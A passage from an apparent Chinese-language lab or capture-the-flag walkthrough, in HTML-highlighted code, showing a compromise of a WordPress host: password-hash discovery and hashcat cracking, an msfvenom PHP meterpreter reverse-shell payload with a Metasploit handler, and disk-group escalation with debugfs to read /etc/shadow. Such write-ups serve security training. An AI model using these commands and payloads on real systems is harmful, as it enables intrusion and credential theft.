class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sys<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span>sys<span class="punctuation">:</span>/dev<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>sync<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/bin/sync</span><br><span class="line">games<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="number">60</span><span class="punctuation">:</span>games<span class="punctuation">:</span>/usr/games<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">man<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="number">12</span><span class="punctuation">:</span>man<span class="punctuation">:</span>/var/cache/man<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">lp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span>lp<span class="punctuation">:</span>/var/spool/lpd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">mail<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span>mail<span class="punctuation">:</span>/var/mail<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">news<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span>news<span class="punctuation">:</span>/var/spool/news<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">uucp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span>uucp<span class="punctuation">:</span>/var/spool/uucp<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">proxy<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span>proxy<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">www-data<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span>www-data<span class="punctuation">:</span>/var/www<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">backup<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span>backup<span class="punctuation">:</span>/var/backups<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">list<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span>Mailing List Manager<span class="punctuation">:</span>/var/list<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">irc<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span>ircd<span class="punctuation">:</span>/var/run/ircd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">gnats<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span>Gnats Bug-Reporting System (admin)<span class="punctuation">:</span>/var/lib/gnats<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">nobody<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>nobody<span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-network<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">100</span><span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span>systemd Network Management<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-resolve<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">101</span><span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span>systemd Resolver<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-timesync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span>systemd Time Synchronization<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">messagebus<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span><span class="number">106</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">syslog<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span><span class="number">110</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/syslog<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">_apt<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">105</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">tss<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">106</span><span class="punctuation">:</span><span class="number">111</span><span class="punctuation">:</span>TPM software stack<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/var/lib/tpm<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">uuidd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">107</span><span class="punctuation">:</span><span class="number">112</span><span class="punctuation">:</span><span class="punctuation">:</span>/run/uuidd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">tcpdump<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">108</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">landscape<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">109</span><span class="punctuation">:</span><span class="number">115</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/lib/landscape<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">pollinate<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">110</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/cache/pollinate<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">usbmux<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">111</span><span class="punctuation">:</span><span class="number">46</span><span class="punctuation">:</span>usbmux daemon<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/var/lib/usbmux<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sshd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">112</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/run/sshd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-coredump<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span>systemd Core Dumper<span class="punctuation">:</span>/<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">lxd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">998</span><span class="punctuation">:</span><span class="number">100</span><span class="punctuation">:</span><span class="punctuation">:</span>/var/snap/lxd/common/lxd<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">fwupd-refresh<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="number">117</span><span class="punctuation">:</span>fwupd-refresh user<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">dora<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/dora<span class="punctuation">:</span>/bin/sh</span><br><span class="line"></span><br><span class="line">cd /home/dora</span><br><span class="line">ls</span><br><span class="line">local.txt</span><br><span class="line"></span><br><span class="line">cat local.txt</span><br><span class="line"></span><br><span class="line">ls -al local.txt</span><br><span class="line">-r-------- <span class="number">1</span> dora dora <span class="number">33</span> Feb <span class="number">16</span> <span class="number">02</span><span class="punctuation">:</span><span class="number">29</span> local.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>etc/passwd</code>发现有用户dora, 在dora主目录中有local.txt文件，但是www-data没有查看权限, 尝试在<code>/var/www/html</code>搜索dora: <code>grep dora * -r</code>, 发现dora hash: <code>$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd /var/www/html</span><br><span class="line">$ grep dora * -r</span><br><span class="line">filemanager/config/.htusers.php<span class="punctuation">:</span>        array(&#x27;dora&#x27;<span class="punctuation">,</span>&#x27;$<span class="number">2</span>a$<span class="number">08</span>$zyiNvVoP/UuSMgO2rKDtLuox.vYj<span class="number">.3</span>hZPVYq3i4oG3/CtgET7CjjS&#x27;<span class="punctuation">,</span>&#x27;/var/www/html&#x27;<span class="punctuation">,</span>&#x27;http<span class="punctuation">:</span><span class="comment">//localhost&#x27;,&#x27;1&#x27;,&#x27;&#x27;,&#x27;0&#x27;,1),</span></span><br><span class="line">wp-includes/js/plupload/moxie.js<span class="punctuation">:</span>                    /(joli|<span class="punctuation">[</span>kxln<span class="punctuation">]</span>?ubuntu|debian|<span class="punctuation">[</span>open<span class="punctuation">]</span>*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)<span class="punctuation">[</span>\/\s-<span class="punctuation">]</span>?(<span class="punctuation">[</span>\w\.-<span class="punctuation">]</span>+)*/i<span class="punctuation">,</span></span><br><span class="line">wp-includes/js/plupload/moxie.js<span class="punctuation">:</span>                                                                                        <span class="comment">// Fedora/Mandriva/CentOS/PCLinuxOS/RedHat/Zenwalk/Linpus</span></span><br></pre></td></tr></table></figure>
+
+<p>hashcat 爆破密码得到 <code>doraemon</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat -h |grep &#x27;$<span class="number">2</span>a&#x27;</span><br><span class="line">hashcat -h |grep &#x27;$<span class="number">2</span>&#x27;</span><br><span class="line">   <span class="number">3200</span> | bcrypt $<span class="number">2</span>*$<span class="punctuation">,</span> Blowfish (Unix)                               | Operating System</span><br><span class="line"></span><br><span class="line">hashcat -m <span class="number">3200</span> dora.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>ssh登录失败， 只能通过密钥对方式登录</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh dora@<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span> (<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256<span class="punctuation">:</span>VnMMoSlX8Y0MsU947B2bAEqDX+KmnqpFLFXtLgsOERw.</span><br><span class="line">This host key is known by the following other names/addresses<span class="punctuation">:</span></span><br><span class="line">    ~/.ssh/known_hosts<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span> <span class="punctuation">[</span>hashed name<span class="punctuation">]</span></span><br><span class="line">Are you sure you want to continue connecting (yes/no/<span class="punctuation">[</span>fingerprint<span class="punctuation">]</span>)? yes</span><br><span class="line">Warning<span class="punctuation">:</span> Permanently added &#x27;<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span>&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">dora@<span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">:</span> Permission denied (publickey).</span><br></pre></td></tr></table></figure>
+
+<p>但是在反弹的www-data的shell里，无法升级到交互式的shell, pyhthon, script, perl, socat都试过了，都不行，最后使用msf获取到shell可以正常切换用户</p>
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.234 LPORT=4444 -f raw -o r.php</code>生成msf反弹shell payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/fileformat/js_unpacker_eval_injection</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">View the full module info with the info<span class="punctuation">,</span> or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set Lhost tun0</span><br><span class="line">Lhost =&gt; <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span></span><br><span class="line">se<span class="punctuation">[</span>*<span class="punctuation">]</span> Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">:</span><span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">:</span><span class="number">37902</span>) at <span class="number">2025</span><span class="number">-02</span><span class="number">-16</span> <span class="number">12</span><span class="punctuation">:</span><span class="number">47</span><span class="punctuation">:</span><span class="number">41</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">34439</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line">su dora</span><br><span class="line">Password<span class="punctuation">:</span> doraemon</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(dora) gid=<span class="number">1000</span>(dora) groups=<span class="number">1000</span>(dora)<span class="punctuation">,</span><span class="number">6</span>(disk)</span><br></pre></td></tr></table></figure>
+
+<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><h2 id="diskgroup"><a href="#diskgroup" class="headerlink" title="diskgroup"></a>diskgroup</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(dora) gid=<span class="number">1000</span>(dora) groups=<span class="number">1000</span>(dora)<span class="punctuation">,</span><span class="number">6</span>(disk)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://vk9-sec.com/disk-group-privilege-escalation/">https://vk9-sec.com/disk-group-privilege-escalation/</a></p>
+</blockquote>
+<p>dora用户有diskgroup权限</p>
+<p>首先查看&#x2F;root挂在磁盘，<code>/dev/mapper/ubuntu--vg-ubuntu--lv</code> 挂在在<code>/</code>目录，执行<code>debugfs /dev/mapper/ubuntu--vg-ubuntu--lv</code></p>
+<p>发现无法写文件，无法实现通过写公钥然后通过ssh登录，在&#x2F;root&#x2F;.ssh下也没有公私钥，之后authorized_keys文件</p>
+<p>读取&#x2F;etc&#x2F;shadow文件，得到root hash: <code>$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">udev                               <span class="number">947</span>M     <span class="number">0</span>  <span class="number">947</span>M   <span class="number">0</span>% /dev</span><br><span class="line">tmpfs                              <span class="number">199</span>M  <span class="number">1.2</span>M  <span class="number">198</span>M   <span class="number">1</span>% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv  <span class="number">9.8</span>G  <span class="number">5.1</span>G  <span class="number">4.3</span>G  <span class="number">55</span>% /</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /dev/shm</span><br><span class="line">tmpfs                              <span class="number">5.0</span>M     <span class="number">0</span>  <span class="number">5.0</span>M   <span class="number">0</span>% /run/lock</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /sys/fs/cgroup</span><br><span class="line">/dev/loop0                          <span class="number">62</span>M   <span class="number">62</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1611</span></span><br><span class="line">/dev/loop2                          <span class="number">50</span>M   <span class="number">50</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/snapd/<span class="number">18596</span></span><br><span class="line">/dev/loop1                          <span class="number">64</span>M   <span class="number">64</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1852</span></span><br><span class="line">/dev/loop3                          <span class="number">92</span>M   <span class="number">92</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">24061</span></span><br><span class="line">/dev/loop4                          <span class="number">68</span>M   <span class="number">68</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">22753</span></span><br><span class="line">/dev/sda2                          <span class="number">1.7</span>G  <span class="number">209</span>M  <span class="number">1.4</span>G  <span class="number">13</span>% /boot</span><br><span class="line">tmpfs                              <span class="number">199</span>M     <span class="number">0</span>  <span class="number">199</span>M   <span class="number">0</span>% /run/user/<span class="number">1000</span></span><br><span class="line">$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv</span><br><span class="line">debugfs <span class="number">1.45</span><span class="number">.5</span> (<span class="number">07</span>-Jan<span class="number">-2020</span>)</span><br><span class="line">debugfs<span class="punctuation">:</span>  mkdir test</span><br><span class="line">mkdir<span class="punctuation">:</span> Filesystem opened read/only</span><br><span class="line">debugfs<span class="punctuation">:</span>  ls /root/.ssh</span><br><span class="line">debugfs<span class="punctuation">:</span>  cd /root/.ssh</span><br><span class="line">debugfs<span class="punctuation">:</span>  ls</span><br><span class="line">authorized_keys</span><br><span class="line"></span><br><span class="line">debugfs<span class="punctuation">:</span>  cat /etc/shadow</span><br><span class="line">root<span class="punctuation">:</span>$<span class="number">6</span>$AIWcIr8PEVxEWgv1$<span class="number">3</span>mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/<span class="number">4.</span>D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.<span class="punctuation">:</span><span class="number">19453</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">daemon<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">bin<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sys<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sync<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">games<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">man<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">lp<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">mail<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">news<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">uucp<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">proxy<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">www-data<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">backup<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">list<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">irc<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">gnats<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">nobody<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-network<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-resolve<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-timesync<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">messagebus<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">syslog<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">_apt<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">tss<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">uuidd<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span 